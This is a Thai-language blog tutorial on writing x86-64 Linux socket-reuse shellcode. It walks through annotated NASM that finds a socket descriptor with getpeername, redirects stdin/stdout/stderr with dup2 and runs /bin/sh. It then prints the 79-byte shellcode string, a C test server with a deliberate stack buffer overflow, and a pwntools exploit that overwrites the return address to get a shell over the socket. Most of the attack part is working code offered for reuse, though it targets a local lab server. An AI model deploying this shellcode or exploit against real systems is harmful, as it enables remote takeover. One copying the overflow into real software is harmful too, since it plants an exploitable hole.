+++ 
authors = ["Jusmistic",]
title = "Linux x86-64 Execve with Socket Reuse"
date = "2021-03-22"
description = "เขียน Shellcode ทำ Socket Reuse บน Linux x86-64 ยังไง มาดูกันค้าบ"
images = ["https://i.imgur.com/4imapAs.png",]
+++

![cover](https://i.imgur.com/4imapAs.png)

ช่วงนี้อ่านเรื่อง socket reuse ดูเห็น Material เป็น x86 ซะส่วนใหญ่ ยังไม่เห็น shellcode ที่เป็น x86-64 เลย (ผมพยายามหาแล้ว แต่ไม่เจออ่ะ ใครเจอเม้นบอกด้วยนะครับ)

โดยปกติแล้วเทคนิคนี้ค่อนข้างเก่า ส่วนตัวไม่เคยใช้ เทคนิคนี้มาก่อนเบย ถือโอกาสอ่ะลองทำซักหน่อย อย่างน้อย ๆ ก็ถือว่าหัดเขียน Assembly ขำ ๆ

บอกก่อนว่า Ref ส่วนใหญ่ผมอ่านมาจาก x86 เพื่อดูว่าหลัก ๆ แล้วการทำ socket reuse ต้องทำอะไรบ้าง แล้วเอามาเขียนใหม่บน x86-64 แค่นั้นเลย ไม่ยาก ซึ่งโครงสร้างหลัก ๆ เอามาจากบทความนี้ขอให้เครดิตไปเต็มผมแค่ก็อปแนวคิดมาเขียนใหม่อ่ะ

[Linux x86 One-Way Shellcode (Socket Reuse)](https://d3fa1t.ninja/2017/09/17/linux-x86-one-way-shellcode-socket-reuse/)

## Socket Reuse คืออะไร? (What)

> ผมว่าผมเขียนไม่ค่อยดีอ่ะ ว่าจะเขียนอธิบาย shellcode เฉย ๆ ไม่ได้จะเขียนทฤษฎี ขี้เกียจเขียนด้วย ถ้าไม่อยากรู้ก็ข้ามไม่อ่านหัวข้อถัดไปเลยค้าบบ

ปกติแล้วใน Linux จะใช้สิ่งที่เรียกว่า File Descriptor (FD) ในการเข้าถึง Input/Output ต่าง ๆ เช่น ไฟล์ ซึ่งใน Linux เองจะมี FD พื้นฐานหลัก ๆ คือ 

- STDIN ใช้ 0 เป็นค่า reference
- STDOUT ใช้ 1 เป็นค่า reference
- STDERR ใช้ 2 เป็นค่า reference

จากลิสท์ด้านบนจะเห็นว่าจริง ๆ แล้ว FD จะถูกอ้างอิงจากตัวเลข โดยปกติถ้าโปรแกรมต้องการสร้าง FD เพื่อคุยกับอะไรบางอย่าง(socket/file) มันเริ่มรันจากค่าที่ต่ำที่สุด ซึ่งในที่นี้คือ 3 แล้วก็เพิ่มขึ้นไปเรื่อย ๆ

ในบางโปรแกรมจะมีการเชื่อมต่อกับผู้ใช้ โดยไม่ได้ใช้ STDIN และ STDOUT แต่จะเขียน socket เพื่อรับ connection ผ่านทาง network แทน ทำให้โปรแกรมจะสร้าง FD เพิ่มและติดต่อกับผู้ใช้ผ่าน FD ใหม่

หลังจากที่แล้ว spawn shell แล้วตัว shell จะใช้ STDIN และ STDOUT ปกติอยู่ ทำให้เราต้องใช้เทคนิค Socket Reuse เพื่อให้เราสามารถติดต่อกับ shell จาก FD ของ socket นั่นเอง

## เมื่อไรและทำไมต้องทำ Socket Reuse (When/Why)

ส่วนตัวผมเข้าใจว่า Socket Reuse มันไม่ใช่เทคนิคที่ใช้โจมตี แต่ใช้ Bypass Exploit Mitigation อย่างนึงซึ่งหลัก ๆ เลยคือ **Service ที่เราไปโจมตีมันอยู่หลัง Firewall แล้วเราไม่สามารถทำ Bind/Reverse Shell ได้** เราเลยต้องมาใช้ FD ที่เราทำการติดต่อกับ service นั้นเพื่อติดต่อกับ shell ของเราแทน

## การทำ Socket Reuse (How)

อย่างที่บอกไปตอนต้น Socket Reuse ไม่ใช่เรื่องใหม่ ผมไม่ได้เป็นคนคิด ผมแค่ก็อป concept มาเขียนใหม่เป็น x86-64 เพราะผมยังไม่เห็นใครทำเฉย ๆ วันหลังถ้ามีคนอยากทำจะได้เอา shellcode ไปใช้หรือโมได้ง่าย ๆ 

**ขั้นตอนการทำ Socket Reuse มีทั้งหมด 3 ขั้นตอน**

1. หา sockfd โดยใช้ฟังก์ชัน getpeername
2. ใช้ dup2 system call เพื่อทำให้ FD 0, 1, และ 2 เชื่อมกับ sockfd ของเรา
3. เรียก shell

### 1. หา sockfd โดยใช้ฟังก์ชัน getpeername

เราสามารถใช้ฟังก์ชัน getpeername ในการตรวจสอบว่าเลข FD ที่เราส่งเข้าไปนั้นเป็น FD ของ socket รึเปล่าซึ่งเป็นค่าที่เราต้องการหาเพื่อนำมาใช้

ซึ่งจาก [man-page](https://man7.org/linux/man-pages/man2/getpeername.2.html) getpeername มีรายละเอียดดังนี้

```c
int getpeername(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
```

หากว่า sockfd ที่เราส่งเข้าไปที่ getpeername system call นั้นเป็น FD ของ socket จริง ๆ ค่าที่ตอบกลับมาใน RAX จะเป็น 0

ซึ่งถ้าเราจะเรียกผ่าน syscall เราต้องจัดการ register ให้มีค่าดังนี้ **เก่งป่ะ? จริง ๆ [แล้วก็อปมาจากนี่จ้า](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)**

- **RAX** = 0x34 ⇒ ค่า syscall ของ getpeername
- **RDI** = sockfd ⇒ เลข FD ที่เราต้องการตรวจสอบ
- **RSI** = *addr ⇒ pointer ไปยังพื้นที่ที่เราต้องการเก็บข้อ address ที่เกี่ยวกับ FD (16 bytes)
- **RDX** = *addr_len ⇒ pointer ไปยังขนาดของ *addr

> จะเห็น *addr ต้องชี้ไปที่พื้นที่ขนาด 16 bytes ซึ่งใน shellcode นี้เราจะใช้ stack ถ้าต้องเอาไปทำ ROP ก็ไปโมกันเองค้าบ

> ผมไม่เข้าใจเหมือนกันว่าทำในบทความของ DHAYALAN ถึงใช้ syscall socketcall(0x66) ทั้ง ๆ ที่ใช้ getpeername เลยก็ได้อ่ะ

#### 1.1 เราทำการเตรียมพวก argument ต่าง ๆ ก่อนเลยซึ่งจะเขียนได้ประมาณนี้

กำหนดค่า rdx และ rdi ให้เป็น 0 ก่อน ปกติเวลาเราเขียน shellcode เมื่อต้องการให้ค่า register ตัวไหนเป็น 0 เราจะเอาตัวนั้น xor กับตัวมันเอง เพราะ $x$ $\oplus$ $x$ = 0
จริง ๆ เราจะใช้ `xor rdi, rdi` ก็ได้ แต่นิสัยส่วนตัวผมชอบ `mov` จากค่าที่เป็น 0 มากกว่าค้าบ ใครถนัดแบบไหนก็เขียน ๆ ไปเถอะไม่ว่ากันค้าบ 

```nasm
; Clear Register
xor rdx, rdx        ; rdx = 0
mov rdi, rdx        ; rdi = 0
```

จากการอ่าน Manual เรารู้ว่าตัวแปร addr เป็น pointer ของ struct ประเภท sockaddr ซึ่งมีหน้าตาประมาณนี้

```c
struct sockaddr {
   unsigned short   sa_family;      // 2 bytes
   char             sa_data[14];    // 14 bytes
};
```

จาก struct ข้างต้นจะเห็นว่าเราต้องการพื้นที่ทั้งหมด 16 bytes เพื่อเก็บข้อมูลของตัวแปร addr

เราทำการ `push rdx` ซึ่งมีค่าเป็น 0 ลงไปใน stack 2 ครั้งบน Intel x86-64 การ push แต่ละครั้งจะทำการลบค่า rsp ไป 8 (rsp = rsp - 8) จากนั้นทำการย้ายค่าของ rsp เข้าไปเก็บที่ rsi 

```nasm
	; rsi = *addr
	push rdx            ; prep stack for *addr
	push rdx            ; prep stack for *addr
	mov rsi, rsp        ; rsi = *addr
```

ตอนนี้ stack เราจะหน้าตาประมาณนี้

```
<      Low Addr      >
[        ....        ]
[ 0x0000000000000000 ]    <- rsp, rsi
[ 0x0000000000000000 ]    
[ 0x0000000000c0ffee ]    <- rsp ก่อน push 2 ครั้ง
[        ....        ]
<      High Addr     >
```

ตอนนี้ rsi ก็ได้เก็บ pointer ที่ชี้ไปยังพื้นที่ที่เราเตรียมไว้สำหรับตัวแปร addr เรียบร้อยแล้ว

ทำการตั้งค่า dl (byte สุดท้ายของ rdx) เป็น 16 ซึ่งเป็นขนาดของ `struct sockaddr` นั่นเอง จากนั้นทำการ `push rdx` ลงไปใน stack จากนั้นทำการย้ายค่าของ rsp ไปเก็บใน rdx 

```nasm
	; rdx = *addr_len
	mov dl, 16          ; addr_len = 16
	push rdx            ; push addr_len to stack
	mov rdx, rsp        ; rdi = *addr_len
	[...]
```

ตอนนี้ stack เราจะหน้าตาประมาณนี้

```
<      Low Addr      >
[        ....        ]
[ 0x0000000000000010 ]    <- rdx, rsp
[ 0x0000000000000000 ]    <- rsi
[ 0x0000000000000000 ]    
[ 0x0000000000c0ffee ]     
[        ....        ]
<      High Addr     >
```

ขออธิบายเพิ่มเติมเกี่ยวกับ dl นิดนึง ให้แยกย่อยจะได้เป็นรูปประมาณนี้ จะเห็นว่า dl คือ byte สุดท้ายของ rdx นั่นเอง

```
[...........rdx..........]  8 bytes
            [....edx.....]  4 bytes ท้ายของ rdx
                  [..dx..]  2 bytes ท้ายของ edx
                  [dh][dl]
                   dh 1 byte แรกของ dx
                   dl 1 byte ท้ายของ dx
```

อ่านมาถึงตรงนี้อาจมีบางคนมีคำถามว่าทำไมไม่ `mov rdx, 16` ไปเลยทำไมต้องมา `mov dl, 16` ด้วย
คำตอบของข้อนี้ง่ายมากเมื่อเห็น opcode ของ Assembly ของทั้งสองคำสั่งนี้เมื่อทำการ assembler เรียบร้อยแล้ว ลองดูนี่นะค้าบ

```nasm
0:  48 c7 c2 10 00 00 00    mov    rdx,0x10
```

```nasm
0:  b2 10                   mov    dl,0x10
```

เห็นอะไรมั้ยครับ จะเห็นว่า `mov rdx, 16` มันจะมี null ใน opcode ด้วยอีกทั้งยังยาว 7 bytes แต่กลับกัน `mov dl, 16` นั้นไม่มี null ใน opcode และยังยาวเพียงแค่ 2 bytes เท่านั้น

ซึ่งสิ่งที่เราต้องคำนึงเสมอในการเขียน Assembly เพื่อเอาไปทำ shellcode นั้นหลัก ๆ มี 2 อย่าง

1. null byte เพราะอาจไปทำให้ shellcode ของเราขาดได้เพราะฟังก์ชันบางตัวอาจตัด input ที่ null byte เช่น strcpy, strcat 
2. ความยาวของ shellcode เนื่องจากบางทีพื้นที่ที่เราสามารถใส่ shellcode ได้นั้นอาจมีจำกัดฉนั้นยิ่งเราเขียนสั้นได้เท่าไรยิ่งดี

*สำหรับบางคนที่พึ่งหัดเขียน Assembly เพื่อไปเขียน shellcode อาจเริ่มจากเขียนให้ถูกก่อน จากนั้นค่อยมาทำการแก้ไขคำสั่งเพื่อไม่ให้มี null byte และมีขนาดสั้นลงในภายหลัง แต่คนเท่ ๆ แบบผมเก่งอยู่แล้ว เขียนไป optimize ไปได้เลย 😎 (หยอก ๆ)*

พอ ๆ โม้มาเยอะและ กลับเข้ามา shellcode ของเราดีกว่าค้าบ ตอนนี้ argument สำหรับฟังก์ชัน getpeername เราพร้อมเรียบร้อยแล้ว

#### 1.2 ทำการเรียก getpeername ผ่าน Syscall 

จะเห็นว่าเรามีการทำ label ชื่อ loop_findfd เพื่อใช้ในการ `jmp` กลับมาเพื่อทำการ loop การทำงาน จากนั้นทำการเพิ่มค่า rdi ขึ้น 1 (ตอนแรกมีค่าเป็น 0) นั่นหมายความว่าค่า rdi ซึ่งเป็นตัวแปร sockfd ที่เราส่งค่าเข้าไปในฟังก์ชัน getpeername จะเพิ่มขึ้นทุกครั้งเมื่อทำการ loop นั่นเอง

```nasm
; syscall getpeername
    loop_findfd:
    ; rdi = sockfc
    inc rdi             ; inc every time when we loop
```

จากนัั้นก็ตั้งค่า rax เป็น 0x34 (จะใส่เป็นเลขฐาน 10 หรือ 16 ก็ได้แล้วแต่ถนัด) ลักษณะเดียวกันกับก่อนหน้านั่นเอง

```nasm
    xor rax, rax        ; rax = 0
    mov al, 0x34        ; rax = 0x34
    syscall             ; call getpeername
```

#### 1.3 ทำการตรวจค่า rax เพื่อหา sockfd

โดยปกติแล้วบน Intel x86-64 เวลา system call คืนค่าจะส่งออกมาผ่าน rax ซึ่ง syscall ของ getpeername ก็เช่นเดียวกัน

อย่างที่เราได้อธิบายไว้ตอนอ่าน man-page ว่าหากเจอ FD ที่เป็น sockfd ค่าที่ตอบกลับมาจะต้องเป็น 0 (rax = 0) นั่นเอง

สิ่งที่เราทำคือเราใช้คำสั่ง `test rax, rax` ในการตรวจสอบ [การทำงานของคำสั่ง test ดูได้ที่นี่](https://en.wikipedia.org/wiki/TEST_(x86_instruction)#:~:text=In%20the%20x86%20assembly%20language,while%20AF%20flag%20is%20undefined.) ให้อธิบายเร็ว ๆ คือหากค่าของ rax != 0 เราจะ `jmp` กลับไปที่ loop_findfd เพื่อหา sockfd จนกว่าจะเจอ

```nasm
	test rax, rax       ; if rax != 0 jmp to loop_findfd
	                        ; else => rdi is sockfd -> dup 
	jne loop_findfd
```

ซึ่งถ้าเมื่อได้ค่า sockfd ที่เราตามหา (rax = 0) มันก็จะไม่ `jmp` แล้วไปทำงานที่คำสั่งต่อไปค้าบ โดยที่ค่า sockfd จะอยู่ที่ rdi นั้นเองค้าบ

> จริง ๆ ตรงนี้เราอาจตรวจสอบเพิ่มเติมด้วยว่า FD นี้เป็นของ IP เราจริง ๆ รึเปล่าแต่ผมขี้เกียจเขียนอ่ะ ถ้าใครอยากตรวจสอบเพิ่มค่าของ IP Address อยู่ที่ตำแหน่ง `rsi+4` นะค้าบบบ

เมื่อเราเอาทั้งหมดมาประกอบร่าง Assembly ของเราจะหน้าตาประมาณนี้ค้าบบ

```nasm
find_fd:

    xor rdx, rdx        ; rdx = 0
    mov rdi, rdx        ; rdi = 0
    
    ; rsi = *addr
    push rdx            ; prep stack for *addr
    push rdx            ; prep stack for *addr
    mov rsi, rsp        ; rsi = *addr

    ; rdx = *addr_len
    mov dl, 16          ; addr_len = 16
    push rdx            ; push addr_len to stack
    mov rdx, rsp        ; rdi = *addr_len

    loop_findfd:
    ; rdi = sockfc
    inc rdi             ; inc every loop

    xor rax, rax        ; rax = 0
    mov al, 0x34        ; rax = 0x34
    syscall             ; call getpeername

    test rax, rax       ; if rax != 0 jmp to loop_findfd
                        ; else => rdi is sockfd -> dup2 
    jne loop_findfd
```

### 2. ใช้ฟังก์ชัน dup2 เพื่อทำให้ fd 0, 1, และ 2 เชื่อมกับ sockfd ของเรา

เมื่อเราได้ค่า sockfd ที่เราต้องการ (ซึ่งตอนนี้อยู่ที่ rdi) สิ่งที่เราต้องทำต่อไปคือใช้งาน system call `dup2` เพื่อคัดลอก sockfd ของ socket เราไปทับ STDIN, STDOUT และ STDERR จะทำให้เราสามารถติดต่อกับ shell ได้นั้นเอง

ซึ่งจาก [man-page](https://man7.org/linux/man-pages/man2/dup2.2.html) page dup2 ต้องการ argument ดังนี้

```c
int dup2(int oldfd, int newfd);
```

ซึ่งถ้าเราจะเรียกผ่าน syscall เราต้องจัดการ register ให้มีค่าดังนี้

- **RAX** = 0x21
- **RDI** = sockfd
- **RSI** = 0,1,2

เมื่อเรารู้แล้วว่าเราต้องทำการตั่งค่า register เพื่อใช้ในการเรียก syscall ยังไงบ้าง เรามาวางแผนกันดีกว่าจะเขียนยังไง ถ้าหากเขียนเป็น C จะได้ประมาณนี้

```c
dup2(sockfd, 0);    //rdi = sockfd, rsi = 0
dup2(sockfd, 1);    //rdi = sockfd, rsi = 1
dup2(sockfd, 2);    //rdi = sockfd, rsi = 2
```

จะเห็นว่าเราต้องทำการเรียก dup2 ทั้งหมด 3 รอบโดยค่า rdi คงเดิมและค่า rsi เพิ่มขึ้นทีละ 1 จากข้อก่อนหน้าค่าของ rdi เป็น sockfd อยู่แล้วนั่นหมายความว่าเราไม่ต้องไปแก้ไขอะไรเลย

เราจึงมาดูที่ค่า rsi กันต่อ จะเริ่มด้วยการตั้งค่า rsi เป็น 0 ก่อนเลย

```nasm
  xor rsi, rsi        ; rsi = 0
```

จากนั้นทำการ label loop_dup2 เพื่อใช้ในการทำ loop และทำการตั้งค่า rax เป็น 0x21 ซึ่งเป็น syscall ของ dup2

```nasm
  loop_dup2:
  mov rax, rsi
  mov al, 0x21        ; rax = 0x21
  syscall             ; call dup2(sockfd, rsi)
```

เมื่อทำ syscall สำเร็จเราก็จะทำการเพิ่มค่า rsi ขึ้น 1 จากนั้นเอาไป `cmp sil, 0x3` ว่า sil (byte สุดท้ายของ rsi) นั้นเท่ากับ 3 หรือยังถ้ายังก็ `jmp` กลับไปที่ `loop_dup2` เพื่อทำการ dup2 ให้ครบทั้ง 0, 1, และ 2 

```nasm
  inc rsi
  cmp sil, 0x3        ; if rsi != 3 jmp back to loop_dup2
                      ; else execv spawn shell
  jne loop_dup2
```

ถ้าหากทำการ dup2 ครบแล้วตอนนี้ค่าของ rsi ควรจะมีค่า เป็น 3 เมื่อทำการ `cmp` ก็จะไม่ทำการ `jmp` กลับไปที่ `loop_dup2` อีกต่อไป

ซึ่งตอนนี้เองเนี่ยทำการเชื่อม sockfd ของเราเข้ากับ STDIN, STDOUT, และ STDERR เรียบร้อย เอามารวมกันเราจะได้ assembly ประมาณนี้ค้าบบบ

```nasm
dup2:
    xor rsi, rsi        ; rsi = 0

    loop_dup2:
    mov rax, rsi
    mov al, 0x21        ; rax = 0x21
    syscall             ; call dup2(sockfd, rsi)

    inc rsi
    cmp sil, 0x3        ; if rsi != 3 jmp back to loop_dup2
                        ; else execv spawn shell
    jne loop_dup2
```


### 3. เรียก Shell

ผมเขียนให้เรียก `/bin/sh` ไม่เป็นด้วยความเป็น Script kiddie ขอยาดก็อป Assembly เพื่อเอามาเขียน shellcode มาจาก [Shellstorm](http://shell-storm.org/shellcode/files/shellcode-806.php) นะค้าบบบ

ในเมื่อผมไม่ได้เขียนเอง ผมก็ไม่เข้าใจว่ามันทำงานยังไง เลยอธิบายให้ทุกคนฟังไม่ได้จริง ๆ ค้าบ

ยังไงรบกวนทุกคนลองแกะดูหน่อยนะครับว่า assembly ชุดนี้มันทำงานอะไร แล้วทำไมต้องเขียนแบบนี้ ทำไมต้องใช้ neg ใช้อย่างอื่นได้มั้ย ตอนที่ shellcode ทำงาน stack มันจะหน้าตาประมาณไหน แค่คิดก็น่าสนุกแล้วใช่มั้ยค้าบ ลองเอาไปทำดูกันนะค้าบ แล้วอย่าลืมกลับมาสอนผมด้วย 😂

หรือถ้าใครงงจริง ๆ ทักไปถาม [@Bank](https://web.facebook.com/bank.eakasit) ได้เลยนะครับ ไม่ต้องเกรงใจ

```nasm
exec_shell:
	xor rax, rax
	mov rbx, 0xFF978CD091969DD1
	neg rbx
	push rbx
	push rsp
	pop rdi
	cdq
	push rdx
	push rdi
	push rsp
	pop rsi
	mov al, 0x3b
	syscall
```

จบแล้วครัพ เมื่อเอามาประกอบร่างกันก็จะได้แบบนี้

```nasm
; Linux x86-64 - Execve ("/bin/sh") Socket Reuse
; Length: 79 bytes
; Date: 21/03/2021
; Author: Puttimate "Jusmistic" Thammasaeng
; Tested on: x86_64 Debian GNU/Linux

; Socket Reuse x86-64
; 1. Finding sockfd using getpeername function.
; 2. Call dup2 sockfd with 0,1 and 2.
; 3. Execute /bin/sh.

; nasm -f elf64 socket_reuse.asm -o socket_reuse
; objdump -d ./socket_reuse |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
; Ref: https://d3fa1t.ninja/2017/09/17/linux-x86-one-way-shellcode-socket-reuse/

find_fd:
    ; 1. Finding sockfd using getpeername function.
    ; int getpeername(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
    ;   src: https://man7.org/linux/man-pages/man2/getpeername.2.html
    ; getpeername syscall: 0x34 
    ;   rax = 0x34 
    ;   rdi = sockfd
    ;   rsi = *addr
    ;   rdx = *addr_len
    ;   src: https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md
    ;   Note:
    ;       sockaddr size is 16 bytes.
    ;   Solution:
    ;       1. Prepare stack for *addr and *addr_len
    ;       2. Call getpeername(sockfd++, ...)
    ;       3. loop until rax eq 0 (if the sockfd is correct rax will eq 0)
    ;       After we found a sockfd IP Address will store at rsi+4.
    ;       You can add an IP checking if you want.

    xor rdx, rdx        ; rdx = 0
    mov rdi, rdx        ; rdi = 0
    
    ; rsi = *addr
    push rdx            ; prep stack for *addr
    push rdx            ; prep stack for *addr
    mov rsi, rsp        ; rsi = *addr

    ; rdx = *addr_len
    mov dl, 16          ; addr_len = 16
    push rdx            ; push addr_len to stack
    mov rdx, rsp        ; rdi = *addr_len

    ; syscall getpeername
    loop_findfd:
    ; rdi = sockfc
    inc rdi             ; inc every loop

    xor rax, rax        ; rax = 0
    mov al, 0x34        ; rax = 0x34
    syscall             ; call getpeername

    test rax, rax       ; if rax != 0 jmp to loop_findfd
                        ; else => rdi is sockfd -> dup2 
    jne loop_findfd


dup2:
    ; 2. Call dup2 sockfd with 0,1 and 2.
    ; int dup2(int oldfd, int newfd);
    ;   src: https://man7.org/linux/man-pages/man2/dup2.2.html
    ; dup2 syscall number: 0x21
    ;   rax = 0x21
    ;   rdi = sockfd
    ;   rsi = 0,1,2
    ;   src: https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md
    ; Solution:
    ;   1. Setup arg for dup2 function.
    ;   2. Call dup2 function.

    xor rsi, rsi        ; rsi = 0

    loop_dup2:
    mov rax, rsi
    mov al, 0x21        ; rax = 0x21
    syscall             ; call dup2(sockfd, rsi)

    inc rsi
    cmp sil, 0x3        ; if rsi != 3 jmp back to loop_dup2
                        ; else execv spawn shell
    jne loop_dup2



exec_shell:
    ; 3. Execute /bin/sh.
    ; I don't know how to write shellcode to spawn shell just use the snippet from http://shell-storm.org/shellcode/files/shellcode-806.php .

    xor rax, rax
    mov rbx, 0xFF978CD091969DD1
    neg rbx
    push rbx
    push rsp
    pop rdi
    cdq
    push rdx
    push rdi
    push rsp
    pop rsi
    mov al, 0x3b
    syscall

;
; Python3
;   sc = b"\x48\x31\xd2\x48\x89\xd7\x52\x52\x48\x89\xe6\xb2\x10\x52\x48\x89\xe2\x48\xff\xc7\x48\x31\xc0\xb0\x34\x0f\x05\x48\x85\xc0\x75\xf1\x48\x31\xf6\x48\x89\xf0\xb0\x21\x0f\x05\x48\xff\xc6\x40\x80\xfe\x03\x75\xf0\x48\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
;   Length: 79 bytes
;

```


## มาทดสอบ Shellcode กันดีกว่าค้าบ

ขั้นแรกเลยผมใช้โจทย์จาก [DHAYALAN](https://d3fa1t.ninja/2017/09/17/linux-x86-one-way-shellcode-socket-reuse/)  มาโมอ่ะ เพราะขี้เกียจเขียนเองจะได้แบบนี้ค้าบ

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>

// src: https://d3fa1t.ninja/2017/09/17/linux-x86-one-way-shellcode-socket-reuse/
// use for testing Socket-reuse shellcode x64

int newsockfd;

void error(const char *msg)
{
    perror(msg);
    exit(1);
}
void greet(int newsockfd){
  int n;
  char Hello[500];
  char buffer[2048];

  sprintf(Hello, "Welcome to my server!Send a message!\nbuffer: %lp\n", &buffer);

  write(newsockfd,Hello,strlen(Hello));

  n = read(newsockfd,buffer,4095);
  if (n < 0) error("ERROR reading from socket");

}
int main(int argc, char *argv[])
{
     int sockfd, portno;
     socklen_t clilen;
     char buffer[4096], reply[5100];
	struct sockaddr sock;
     struct sockaddr_in serv_addr, cli_addr;
     int n;
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd < 0) 
        error("ERROR opening socket");
     bzero((char *) &serv_addr, sizeof(serv_addr));
     portno = 1337;
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_addr.s_addr = INADDR_ANY;
     serv_addr.sin_port = htons(portno);
     if (bind(sockfd, (struct sockaddr *) &serv_addr,
              sizeof(serv_addr)) < 0) 
              error("ERROR on binding");
	printf("\n\n Server socket number is %d\n\n",sockfd);
     listen(sockfd,5);

     clilen = sizeof(cli_addr);
     newsockfd = accept(sockfd, 
                 (struct sockaddr *) &cli_addr, 
                 &clilen);
	printf("\n\n Client socket number is %d\n\n",newsockfd);
     if (newsockfd < 0) 
          error("ERROR on accept");
     while (1) {
        greet(newsockfd);
        }
     close(newsockfd);
     close(sockfd);
     return 0; 
}
```

จากนั้นเราลองเขียน [exploit.py](https://gist.github.com/jusmistic/08c1ae03cb1cef85ecfecbec9e4855ce#file-03_exploit-py) จะได้แบบนี้ค้าบบ

```python
from pwn import *

def exp():
    p = remote("localhost", 1337)

    p.recvuntil(": ")
    client_addr = int(p.recvline()[:-1], 16)
    print(f"Buffer Address: {hex(client_addr)}")
    # p.recvuntil(": ")

    sc = b"\x48\x31\xd2\x48\x89\xd7\x52\x52\x48\x89\xe6\xb2\x10\x52\x48\x89\xe2\x48\xff\xc7\x48\x31\xc0\xb0\x34\x0f\x05\x48\x85\xc0\x75\xf1\x48\x31\xf6\x48\x89\xf0\xb0\x21\x0f\x05\x48\xff\xc6\x40\x80\xfe\x03\x75\xf0\x48\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    buf =b""
    buf += b"\x90"*200
    buf += sc
    buf += b"\x90"*(0xa00-len(buf))
    buf += b"B"*8
    buf += p64(client_addr+150)
    buf += b"D"*20

    p.sendline(buf)

    p.interactive()
exp()
```

เมื่อเราลองทำการรัน Exploit ก็จะเห็นว่าเราสามารถติดต่อกับ shell ของเราผ่าน sockfd ของ socket ที่เราใช้โจมตี โดยที่เมื่อเราจะตรวจสอบดูค่า FD ของ Process โจทย์ของเราจะเห็นว่ามันเชื่อมไปที่ FD ของ Socket เรานั้นเอง (ตรงหมายเลข 1)

![](https://i.imgur.com/byYFTtX.png)

Code ทั้งหมดอยู่ที่ Gist นี้ค้าบบบ

[Socket-reuse-Linux-x86-64.asm](https://gist.github.com/jusmistic/08c1ae03cb1cef85ecfecbec9e4855ce)

สำหรับบทความนี้ก็จบแค่นี้ค้าบ ถ้าสงสัยตรงไหนไปถาม [@Bankie](https://web.facebook.com/bank.eakasit) นะค้าบทักไปได้ 24 hr เบยยย

ขอบคุณที่อ่านจนจบค้าบ ถ้าใครอ่านแล้วงง ๆ ตรงไหนก็สู้ ๆ แล้วกัน(หยอกๆๆ) ผมอาจเขียนไม่ค่อยดีเท่าไรค้าบเลยงง มีอะไรแนะนำกันได้หรือถ้าผิดตรงไหนก็บอกได้เลยนะครับ ยินดีมาก ๆ จะเอาไปปรับปรุง ❤

ขอบคุณเทพ [@Bongtrop](https://suam.wtf/authors/bongtrop/) ที่ช่วยดูบทความให้ครับ กราบงาม ๆ สักสามทีครัพ

สุดท้ายแล้วก็ฝากไว้ประโยคเดียวค้าบ

> UV ไม่ดีต่อผิว แต่ U so cute ไม่ดีต่อจัยค้าบบบ

**บรัย**

## Reference

- [Linux x86 One-Way Shellcode. (Socket Reuse)](https://d3fa1t.ninja/2017/09/17/linux-x86-one-way-shellcode-socket-reuse/)
- [Linux System Call Table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)
- [getpeername(2) - Linux manual page](https://man7.org/linux/man-pages/man2/getpeername.2.html)
- [dup(2) - Linux manual page](https://man7.org/linux/man-pages/man2/dup2.2.html)
- [Linux/x86-64 - Execute /bin/sh - 27 bytes](http://shell-storm.org/shellcode/files/shellcode-806.php)
